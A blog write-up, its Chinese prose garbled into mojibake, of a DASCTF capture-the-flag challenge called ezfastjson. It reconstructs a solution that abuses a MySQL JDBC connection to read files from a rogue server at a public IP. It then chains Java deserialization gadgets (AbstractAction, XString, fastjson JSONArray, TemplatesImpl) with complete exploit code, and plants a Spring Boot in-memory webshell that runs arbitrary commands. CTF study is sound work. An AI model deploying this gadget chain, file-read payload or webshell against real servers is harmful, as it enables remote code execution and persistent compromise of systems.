---
layout: post
title: DASCTF ezfastjsonèµ›é¢˜å¤ç°
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzi
---





```java
ç”¨åˆ°äº† Abstractactionè¿™æ¡é“¾å­
```



## è‡ªå·±å½“æ—¶åšé¢˜çš„æ€è€ƒ

è¿™é“é¢˜å’Œä¹‹å‰çš„é‚£ä¸ªæŸé¹­æ¯çš„é‚£é“é¢˜å¥½ç›¸ä¼¼ï¼Œé¡µé¢éƒ½æ˜¯ä¸€æ ·çš„ã€‚

![image-20231125103229032](..\img\final\image-20231125103229032.png)

å¥‡æ€ªçš„æ˜¯å®ƒçš„å“åº”åŒ…å¹¶æ²¡æœ‰ä»»ä½•æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Ÿ

![image-20231125105729022](..\img\final\image-20231125105729022.png)

è€ƒè™‘ Mysql connector RCE,ä½†æ˜¯è¿™ç§æ–¹æ³•æ˜¯è¿æ¥åˆ°æ¶æ„çš„mysqlæœåŠ¡å™¨ï¼Œå¯æ˜¯è¿™é“é¢˜çš„mysqlæœåŠ¡å™¨æ˜¯é¢˜ç›®ç»™çš„ï¼ˆä¸å¯æ§ï¼‰

çŒœæµ‹å®ƒåé¢çš„æºç æ˜¯ï¼Œç›´æ¥æŠŠè¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªæ‹¼æ¥



å…ˆæ„é€ ä¸€ä¸ªæ¶æ„çš„æœåŠ¡å™¨çš„æ¶æ„è¿æ¥ï¼ˆï¼‰

![image-20231125115728882](..\img\final\image-20231125115728882.png)

å¹¶ä¸”ä¼ å…¥å€¼ä¹Ÿæ˜¯å¯ä»¥ä»»æ„ä¿®æ”¹çš„è€Œä¸”æ˜¯jsonæ¨¡å¼è§£æï¼Œç»“åˆé¢˜ç›®æ˜¯ezfastjson

![image-20231125115948115](..\img\final\image-20231125115948115.png)

åœ¨æœ¬åœ°æ„é€ ç›´æ¥ååºåˆ—åŒ–èµ·ç ä¼šè¿æ¥ä¸Šæ¶æ„çš„æœåŠ¡å™¨ï¼Œä½†æ˜¯åˆ°äº†é¢˜ç›®ä¸€ç‚¹å“åº”éƒ½æ²¡æœ‰

![image-20231125122613470](..\img\final\image-20231125122613470.png)

ç›´æ¥æ‰“urldnså‘ç°æ˜¯å‡ºç½‘çš„ï¼Œå•Šå•Šå•Šï¼Ÿï¼Ÿï¼Ÿï¼ˆçœ‹ä¸€ä¸‹é¢˜è§£ï¼Œå·²ç»ä¸€è§£äº†ï¼‰

è«éç›´æ¥æ‰“é“¾å­ï¼Ÿï¼Ÿï¼Ÿ

![image-20231125124730407](..\img\final\image-20231125124730407.png)

ç›²æ‰“jdbcæ²¡æ‰“é€šï¼Œå…¶å®æˆ‘æ„Ÿè§‰jaråŒ…ä¸­è‚¯å®šæ²¡æœ‰å…¶ä»–çš„ç¬¬ä¸‰æ–¹åº“ä¾èµ–ï¼Œç»§ç»­æ‰“ä¸€ä¸‹jndi

![image-20231125132301834](..\img\final\image-20231125132301834.png)



## èµ›åå¤ç°

åªæ‰“é€šäº†urldnsï¼Œä»¥ä¸ºè¿™é“é¢˜æ˜¯ä¸€ä¸ªé»‘ç›’é¢˜ç›®ï¼Œå­¦é•¿ç›´æ¥æ‹¿é»‘ç›’æ‰“çš„ï¼Œç”¨urldnsæ¢æµ‹ä¾èµ–

ç„¶åå‘ç°æ˜¯ä¸€ä¸ªmysqlä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œä¸Šä¸€ç¯‡æ–‡ç« å·²ç»è¯¦ç»†ä»‹ç»äº†

æœ¬åœ°ç”¨çš„MySQL_Fake_Server-masterè¿™ä¸ªé¡¹ç›®ç›´æ¥å¯åŠ¨ï¼Œserver.py

```java
import java.sql.Connection;
import java.sql.DriverManager;
    public class payload {
        public static void main(String[] args) throws Exception {
            String driver = "com.mysql.cj.jdbc.Driver";
            String DB_URL = "jdbc:mysql://8.130.116.247:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
                DB_URL="jdbc:mysql://8.130.116.247:3307?useSSL=true&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_C:\\Users\\c'x'k\\Desktop\\MySQL_Fake_Server-master\\ysoserial-0.0.6-SNAPSHOT-all.jar";

            String username = "root";
            String password = "200377";

            Class.forName(driver);

            Connection conn = DriverManager.getConnection(DB_URL);

        }
    }
```

å› ä¸ºé¢˜ç›®ç”¨çš„jsonä¼ è¾“

```java
{"host":"8.130.116.247:3307/test?user=fileread_file:///&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#"}
```

è¯»å–æ ¹ç›®å½•çš„æ–‡ä»¶ï¼Œåœ¨æœåŠ¡å™¨å¼€å¯ç›‘å¬

![image-20231128163121058](..\img\final\image-20231128163121058.png)

![image-20231128163152864](..\img\final\image-20231128163152864.png)

![image-20231128163225474](..\img\final\image-20231128163225474.png)

![image-20231128163405972](..\img\final\image-20231128163405972.png)

app/ezfastjson-0.0.1-SNAPSHOT.jarç›´æ¥è¯»å–è¿™ä¸ª

![image-20231128163628867](..\img\final\image-20231128163628867.png)

### å¼€å§‹åˆ†æ

```java
fastjson 1.2.43
groovy-3.0.19
mysql-connector-java-8.0.1
snakeyaml-1.30
```

groovyè¿™ä¸ªä¾èµ–æ²¡è§è¿‡ã€‚

å•Šfastjsonhttps://github.com/safe6Sec/Fastjsonï¼Œè¿™ä¸ªæ¢æµ‹ä¾èµ–ç‰ˆæœ¬ä¹Ÿä¸é è°±å‘€ï¼Œé¢˜ç›®æ˜¯1.2.43çš„

![image-20231128165326167](..\img\final\image-20231128165326167.png)

æœç„¶æ˜¯ç›´æ¥å°†ä¼ å…¥çš„jsonå¯¹è±¡ï¼Œç›´æ¥è¿›è¡ŒJSONçš„ååºåˆ—åŒ–

ä¼ å…¥urldnsé“¾å­çš„æ—¶å€™æ˜¯ï¼ŒparseObjectè¿›è¡Œååºåˆ—åŒ–

ä¼ å…¥hostçš„æ—¶å€™æ˜¯è¿›è¡Œjdbcçš„è¿æ¥ï¼ˆè¿™ä¸€å—çš„ä»£ç æ²¡æƒ³åˆ°ï¼Œä½†ä¹Ÿåº”è¯¥æƒ³åˆ°çš„ï¼‰

```java
public class TestMySQLConnectionController {
    @RequestMapping({"/testMySQLConnection"})
    public String showTestMySQLConnectionPage() {
        return "testMySQLConnection";
    }

    @PostMapping({"/testMySQLConnection"})
    @ResponseBody
    public String testMySQLConnection(@RequestBody String jsonData, Model model) {//jsonDataå°±æ˜¯æˆ‘ä»¬postä¼ çš„å‚æ•°
        try {
            JSONObject json = JSONObject.parseObject(jsonData);
            if (jsonData.contains("@") || jsonData.contains("\\x") || jsonData.contains("\\u")) {
                //è¿™é‡Œç¦ç”¨ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢ç»•è¿‡ä½†å‘ƒå‘ƒå‘ƒï¼Œä¸åº”è¯¥åœ¨å‰é¢ç¦ç”¨å˜›ï¼Œæ¯•ç«Ÿåˆ°è¿™é‡Œå·²ç»ååºåˆ—åŒ–æˆåŠŸäº†å”‰
                return "å‡ºé”™äº†";
            }
            String host = json.getString("host");
            String port = json.getString("port");
            String database = json.getString("database");
            String username = json.getString("username");
            String password = json.getString("password");
            System.out.println(host);
            String url = "jdbc:mysql://" + host + ":" + port + "/" + database + "?user=" + username + "&password=" + password; 
            //
            System.out.println(url);
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection connection = DriverManager.getConnection(url);
            model.addAttribute("message", "MySQLæ•°æ®åº“è¿æ¥æˆåŠŸï¼");
            connection.close();
            return "testMySQLConnection";
        } catch (ClassNotFoundException | SQLException e) {
            model.addAttribute("message", "MySQLæ•°æ®åº“è¿æ¥å¤±è´¥ï¼Œè¯·æ£€æŸ¥è¿æ¥ä¿¡æ¯ã€‚");
            e.printStackTrace();
            return "testMySQLConnection";
        }
    }

    @PostMapping({"/readObj"})
    @ResponseBody
    public String deserializeData(@RequestParam String base64Data) {
        try {
            new MyObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64Data))).readObject();//è¿™æ‰æ˜¯çœŸæ­£çš„ååºåˆ—åŒ–çš„ç‚¹
            return "ok";
        } catch (Exception var4) {
            return var4.getMessage();
        }
    }
}
```

```java
    private static final String[] blackList = {"AbstractTranslet", "javax.management", "JSONObject", "bad", "hot", "hash", "java.security", "jackson"};
```

### éé¢„æœŸï¼šè¿™é“é¢˜ç›®å‰å·²ç»è½¬æ¢ä¸ºäº†fastjson 1.2.43ååºåˆ—åŒ–æ¼æ´

çœ‹å®˜æ–¹wpè¯´æ²¡æœ‰bashï¼Œæ€ªä¸å¾—å­¦é•¿åå¼¹shellæ²¡æˆåŠŸï¼Œå³ä½¿æˆ‘æ‰“åˆ°è¿™åº”è¯¥ä¹Ÿè’™è”½

```java
Thread.sleep()
```

æŒ‰ç†è¯´æˆ‘æœ¬åœ°åº”è¯¥é€šçš„å‘€ã€‚ã€‚ã€‚

![image-20231128210814332](..\img\final\image-20231128210814332.png)

ç”¨è¿™ä¸ªè½¯ä»¶å°±èƒ½ä¸€æŠŠæ¢­ï¼Œä½†æ˜¯å‚æ•°åªèƒ½è®¾ç½®Runtimeå‘½ä»¤æ‰§è¡Œé‡Œé¢çš„ï¼Œæˆ‘æœ¬æƒ³æä¸€ä¸ªThread.sleepè¿™æ ·æˆä¸æˆåŠŸå°±èƒ½çœ‹å‡ºæ¥ï¼Œåç¼–è¯‘å·¥å…·ï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚

![image-20231128211807822](..\img\final\image-20231128211807822.png)

### é¢„æœŸè§£

```java
{"AbstractTranslet", "javax.management", "JSONObject", "bad", "hot", "hash", "java.security", "jackson"};
```

è¿‡æ»¤äº†å¼€å¤´hash(hashmap/hashtable)ï¼Œfastjsonå’Œjacksonéƒ½æ²¡äº†ï¼ŒbadAttributeä¹Ÿæ²¡äº†ï¼Œhotå°±æ˜¯é‚£ä¸ªequalsä¹Ÿæ²¡äº†

java.security.SignObjectäºŒæ¬¡ååºåˆ—åŒ–

javax.management.BadAttributeValueExpException

AbstractTransletç±»ä¸çŸ¥é“æ˜¯è¿‡æ»¤å“ªä¸ªçš„æš‚æ—¶æ²¡æƒ³åˆ°



æŠŠæˆ‘å¸¸è§çš„é“¾å­éƒ½ææ²¡äº†--->å”¯ä¸€å‰©çš„ä¹Ÿå°±æ˜¯ 

TemplatesImplåé¢è¿™ä¸ªäº†ï¼Œä½†æ˜¯æ€ä¹ˆè§¦å‘å‘¢  getOutputProperties/newTransformer

ç›¸æ¯”è¾ƒè¿™ä¿©ä¸ªæ–¹æ³•è€Œè¨€ï¼Œgetteræ–¹æ³•ç›¸å¯¹å®¹æ˜“ä¸€ç‚¹

```java
match (source:Method {NAME:"readObject"})
match (sink:Method {NAME0:"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties"})
with source, collect(sink) as sinks
//é€šè¿‡å°† sink èŠ‚ç‚¹å½’é›†åˆ° sinks åˆ—è¡¨ä¸­ï¼Œåç»­çš„æ“ä½œå¯ä»¥é’ˆå¯¹æ•´ä¸ªåˆ—è¡¨è¿›è¡Œå¤„ç†
call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path
    //
where none(n in nodes(path) where 
    n.NAME0 in ["java.util.Hashmap"]
)
return path limit 1
```

```java
match (source:Method {NAME:"readObject"})
    match (sink:Method {NAME0:"javax.xml.transform.Templates.getOutputProperties"})
with source, collect(sink) as sinks
call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path
return path limit 1
```



```java
 javax.swing.AbstractAction#readObject -> javax.swing.AbstractAction#putValue ->
javax.swing.AbstractAction#firePropertyChange -> java.lang.Object#equals
```





### è°ƒè¯•é“¾å­

é¦–å…ˆåˆå§‹åŒ–äº†ï¼Œ SyledEditorKitçš„å†…ç½®ç±»AlignmentAction,

StyledTextAction extends TextAction

TextAction extends AbstractAction

![image-20231129195830037](..\img\final\image-20231129195830037.png)

ä¸ºå•¥è¦è¿™ä¹ˆéº»çƒ¦ä¸èƒ½ç›´æ¥åå°„è¿™ä¸ªAbstractActionçš„ç±»ï¼Œç„¶ååå°„è°ƒç”¨è¿™ä¸ªå±æ€§å˜›ï¼Ÿï¼Ÿï¼Ÿè¿™é‡Œèµ‹å€¼æ˜¯ä¸ºäº†ä¸‹é¢ä¸ä¸ºç©º

è°ƒè¯•åˆ°æœ€åå‘ç°äº†ä¸€ä¸ªé—®é¢˜

è¿™ä¸ªchangeSupportçš„å€¼åå°„ä¸åˆ°å€¼

![image-20231129230446755](..\img\final\image-20231129230446755.png)

ä¸ç†è§£ï¼Œå°±æ˜¯è°ƒç”¨ä¸åˆ°

![image-20231129231510303](..\img\final\image-20231129231510303.png)

åå°„çš„æ—¶å€™æŠŠé‚£ä¸ªObjectå¯¹è±¡æ”¹ä¸ºå­ç±»å³å¯

```java
Field changeSupport = Class.forName("javax.swing.AbstractAction").getDeclaredField("changeSupport");
        changeSupport.setAccessible(true);
        changeSupport.set(action,new SwingPropertyChangeSupport("11"));
```

å‘ç°æ˜¯å¯ä»¥çš„è¿™æ ·å°±é€šäº†

![image-20231129233008808](..\img\final\image-20231129233008808.png)

å½“å‰çš„poc

```java
import com.sun.org.apache.xpath.internal.objects.XString;

import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.io.*;
import java.lang.reflect.Field;

public class tiashi {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        StyledEditorKit.AlignmentAction action=new StyledEditorKit.AlignmentAction("age",1);
       // action.putValue("Name","bb");//å°±æ˜¯å½“keyåŒåçš„æ—¶å€™ï¼Œåé¢é‚£ä¸ªå°±æ˜¯æ–°çš„newvalue å‰é¢é‚£ä¸ªå°±æ˜¯æ—§çš„oldvalue
       // action.putValue("cc","dd");
        //protected SwingPropertyChangeSupport changeSupport;

//        Field changeSupport = action.getClass().sugetDeclaredField("changeSupport");
//        changeSupport.setAccessible(true);
//        changeSupport.set(action,new SwingPropertyChangeSupport("a"));
   //   setField(action,"changeSupport",new SwingPropertyChangeSupport('a'));
        Field changeSupport = Class.forName("javax.swing.AbstractAction").getDeclaredField("changeSupport");
        changeSupport.setAccessible(true);
        changeSupport.set(action,new SwingPropertyChangeSupport("11"));


        //åŸç†æ˜ç™½äº†ï¼Œä¸å°±æ˜¯keyç›¸ç­‰ç„¶åé‚£å•¥å˜›è¿™ä¸so easyè‡ªå·±æ„é€ ä¸€ä¸‹å¸Œæœ›ä¸è¢«æ‰“è„¸
        //action.putValue("JYcxk",oldValue)  Xstring    oldValue.equals(newValue)
        //action.putValue("JYcxk",newvalue) wusuowei
        XString xString=new XString("a");
        action.putValue("JYcxk1",xString) ;
        action.putValue("JYcxk2","aa") ;
      //  serialize(action);
        unserialize("ser.bin");


    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
    public static void setField(Object obj,String name,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        try{
            Field declaredField = obj.getClass().getDeclaredField(name);
            declaredField.setAccessible(true);
            declaredField.set(obj,newobj);
//            Field declaredField = obj.getClass().getSuperclass().getDeclaredField(name);
//            declaredField.setAccessible(true);
//            declaredField.set(obj,newobj);

        }catch (Exception e){
            Field declaredField = obj.getClass().getSuperclass().getDeclaredField(name);
            declaredField.setAccessible(true);
            declaredField.set(obj,newobj);
        }
    }
}
```

åºåˆ—åŒ–æˆåŠŸä¹‹åæ”¹ä¸ºç›¸åŒçš„keyå³å¯ï¼Œçœ‹çš„âœŒçš„æ–‡ç« ï¼Œï¼ˆtqlğŸ˜­ğŸ˜­ğŸ˜­ï¼‰

![image-20231129233133524](..\img\final\image-20231129233133524.png)

æ¢ç©¶ä¸€ä¸‹åŸç†ï¼ŒåŸç†å…¶å®å°±æ˜¯ï¼š

#### AbstractAction.java#redObject

```java
private void readObject(ObjectInputStream s) throws ClassNotFoundException,
        IOException {
        s.defaultReadObject();
        for (int counter = s.readInt() - 1; counter >= 0; counter--) {//éå†æ•°ç»„ä¸ªæ•°
            putValue((String)s.readObject(), s.readObject());//è¿™é‡Œè¿›å…¥putValueæ–¹æ³•
        }
    }
```

#### AbstractAction.java#putval

```java
public void putValue(String key, Object newValue) {
        Object oldValue = null;
        if (key == "enabled") {
            if (newValue == null || !(newValue instanceof Boolean)) {
                newValue = false;
            }
            oldValue = enabled;
            enabled = (Boolean)newValue;
        } else {//ç›´æ¥è¿›å…¥è¿™ä¸ª
            if (arrayTable == null) {
                arrayTable = new ArrayTable();//å¦‚æœä¸ºnullå°±ä¼šå£°æ˜ä¸€ä¸ªArrayTable
            }
            if (arrayTable.containsKey(key))//arrayTableå°±æ˜¯ä¹‹å‰æ”¾å…¥çš„å€¼ï¼ŒcontainsKeyå°±æ˜¯è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœkeyåœ¨ä»¥å‰åŠ å…¥è¿›å»
                //oldValue å°±ä¼šå˜æˆtableæ•°ç»„ä¸­åŸæ¥keyçš„valueå€¼
                oldValue = arrayTable.get(key);
            if (newValue == null) {
                arrayTable.remove(key);
            } else {
                arrayTable.put(key,newValue);//newValueå°±æ˜¯ä¼ å…¥ç›¸åŒkeyçš„valueçš„å€¼
            }
        }
        firePropertyChange(key, oldValue, newValue);
    }
ä¸¾ä¸ªä¾‹å­ï¼š
action.putValue("JYcxk1",xString) ;
action.putValue("JYcxk2","aa");
xStringå°±æ˜¯oldValue
"aa"å°±æ˜¯newValue     
```

#### ç„¶åè°ƒç”¨firePropertyChange

```java
 protected void firePropertyChange(String propertyName, Object oldValue, Object newValue) {
        if (changeSupport == null ||
            (oldValue != null && newValue != null && oldValue.equals(newValue))) {
            //æƒ³è¦è°ƒç”¨ oldValue.equals(newValue)éœ€è¦ å‰é¢changeSupport!=nullä¹Ÿå°±æ˜¯éœ€è¦èµ‹åˆå€¼
            //è¿™é‡Œåå°„å¡äº†ä¸€ä¸‹ï¼Œåœ¨ä¸Šé¢
            return;
        }
        changeSupport.firePropertyChange(propertyName, oldValue, newValue);
    }
```

å› ä¸ºAbstractActionç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©å®ƒçš„å­ç±»

```java
StyledEditorKit.AlignmentAction action=new StyledEditorKit.AlignmentAction("age",1);
ç”¨çš„AlignmentActionè¿™ä¸ªå†…éƒ¨ç±»ï¼Œæ„é€ æ–¹æ³•ä¸€è·¯super()å°±èƒ½è°ƒç”¨åˆ°çˆ¶ç±»
```

ç®€å•çš„æ–¹æ³•æ˜¯ä¿®æ”¹16è¿›åˆ¶ï¼Œè¿˜æœ‰ä¸€ç§æ¯”è¾ƒå¤æ‚çš„æ–¹æ³•æ˜¯ä¿®æ”¹åºåˆ—åŒ–çš„æ“ä½œï¼Œå› ä¸ºåˆ°äº†é¢˜ç›®æ˜¯ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ‰€ä»¥ä¸ä¼šå½±å“ï¼Œå’Œé‚£ä¸ªjacksoné‡å†™æ–¹æ³•æ˜¯ä¸€æ ·çš„

##### çœ‹ä¸€ä¸‹ writeObjectçš„æµç¨‹

```java
  if (validCount > 0) {
                for (Object key : keys) {
                    if (key != null) {
                        s.writeObject(key);
                        s.writeObject(table.get(key));
                        if (--validCount == 0) {
                            break;
                        }
                    }
                }
            }
```

#### ç›´æ¥é‡å†™ArrayTable#writeArrayTableçš„æ–¹æ³•å³å¯

XString---->JSONArrayè§¦å‘Templates#getteræ–¹æ³•ï¼Œå’ŒJSONParseåŸºæœ¬ä¸€æ ·

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;

public class Exploit {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NotFoundException, IOException, CannotCompileException {

        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes",
                new byte[][]{ClassPool.getDefault().get(TEMPOC.class.getName()).toBytecode()}
        );
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        ArrayList arrayList = new ArrayList();
        arrayList.add(templates);
        //è¿™é‡Œå£°æ˜äº†æ•°ç»„åˆ—è¡¨ï¼Œå¹¶ä¸”æŠŠtemplatesæ·»åŠ äº†è¿›å»

        JSONArray toStringBean = new JSONArray(arrayList);//è¿™
        XString xString=new XString("a");
        xString.equals(toStringBean);
    }
    public static void setFieldValue(Object obj,String name,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(name);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);
    }
}

```

#### ç„¶åå°±æ˜¯AbstractActionè§¦å‘Xstringçš„equalsæ–¹æ³•äº†

##### æœ€åçš„payload

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.awt.event.ActionEvent;
import java.io.*;
import java.lang.reflect.Field;
import java.util.ArrayList;

public class Exploit {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, ClassNotFoundException {

        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes",
                new byte[][]{ClassPool.getDefault().get(TEMPOC.class.getName()).toBytecode()}
        );
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        ArrayList arrayList = new ArrayList();
        arrayList.add(templates);
        //è¿™é‡Œå£°æ˜äº†æ•°ç»„åˆ—è¡¨ï¼Œå¹¶ä¸”æŠŠtemplatesæ·»åŠ äº†è¿›å»

        JSONArray toStringBean = new JSONArray(arrayList);//è¿™
        XString xString=new XString("a");
        //xString.equals(toStringBean);

        StyledEditorKit.AlignmentAction action=new StyledEditorKit.AlignmentAction("age",1);
        action.putValue("JYcxk1",xString);
        action.putValue("JYcxk2",toStringBean);

        Class<?> aClass = Class.forName("javax.swing.AbstractAction");
        Field changeSupport = aClass.getDeclaredField("changeSupport");
        changeSupport.setAccessible(true);
        changeSupport.set(action,new SwingPropertyChangeSupport(""));


       // serialize(action);
        unserialize("ser.bin");




    }
    public static void setFieldValue(Object obj,String name,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(name);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
}

```

åœ¨ç”Ÿæˆåºåˆ—åŒ–çš„ser.binæ–‡ä»¶éœ€è¦ä¿®æ”¹keyæ˜¯ä¸€æ ·çš„å€¼ï¼Œç”¨010æŠŠJYcxk2æ”¹æˆJYcxk1å³å¯

##### è°ƒç”¨é“¾å­

![image-20231130110137783](..\img\final\image-20231130110137783.png)





### æ‰“é¢˜ç›®çš„ç¯å¢ƒ

æ™šäº†ä¸€ä¸¢ä¸¢ï¼Œé¢˜ç›®ç¯å¢ƒæ˜¨å¤©è¿˜æœ‰ä»Šå¤©å°±æ²¡äº†æ‰€ä»¥ç›´æ¥æ­å»ºåœ¨æœåŠ¡å™¨ä¸Š

é¦–å…ˆé¢˜ç›®æ˜¯å‡ºç½‘çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„urldnså·²ç»æ¢æµ‹è¿‡äº†ï¼Œé’ˆå¯¹linuxæœåŠ¡å™¨ç¼ºå°‘å•¥bashè¿™ç§å‘½ä»¤ï¼Œè¿˜æ˜¯æ„Ÿè§‰æ‰“ä¸€ä¸ªThread.sleep()çœ‹æœåŠ¡å™¨çš„å»¶è¿Ÿæ¯”è¾ƒé è°±é€šæ²¡é€š

![image-20231130113135328](..\img\final\image-20231130113135328.png)

å› ä¸ºæ²¡æœ‰bashå‘½ä»¤ä¸èƒ½åå¼¹shellæ‰€ä»¥å…ˆæ‰“ä¸€ä¸ªå†…å­˜é©¬

#### //springboot 2.6 + å†…å­˜é©¬

```java
 package com.example.testfang;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

//springboot 2.6 + å†…å­˜é©¬
public class MemShell extends AbstractTranslet {

    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = MemShell.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            MemShell springControllerMemShell = new MemShell();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
//            hi.printStackTrace();
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

æ‰“å…¥å†…å­˜é©¬åï¼Œæ²¡æƒé™è¯»å–flagï¼Œçœ‹wpéœ€è¦suidææƒ

![image-20231130120952897](..\img\final\image-20231130120952897.png)

ç”¨çš„eqnææƒï¼Œæ²¡ç¯å¢ƒäº†æœ€åå°±ä¸æ¼”ç¤ºäº†

![image-20231130121024768](..\img\final\image-20231130121024768.png)

### åä¼ ï¼šé—®äº†å‡ ä¸ªå¥½å‹éƒ½è¯´ç”¨å“¥æ–¯æ‹‰ï¼Œç”šè‡³å¾€é‡Œé¢å†™äº†ä¸ªå“¥æ–¯æ‹‰  æˆ‘ï¼Ÿï¼Ÿï¼ŸğŸ¥ºğŸ¥ºğŸ¥º å•¥å†°èã€å“¥æ–¯æ‹‰åªå¬è¯´è¿‡æ²¡ç”¨è¿‡

æŠ€æœ¯è¾¾åˆ°å†æ¥ç»­å†™ï¼Œä¸è¿‡æˆ‘ç®€å•çš„é—®äº†ä»¥ä¸‹æ€è·¯

å°±æ˜¯å’Œå¹³å¸¸çš„é©¬ä¸€æ ·ï¼Œåªä¸è¿‡æœ‰å“¥æ–¯æ‹‰è¿™ä¸ªè½¯ä»¶å¯ä»¥é“¾æ¥ã€‚





































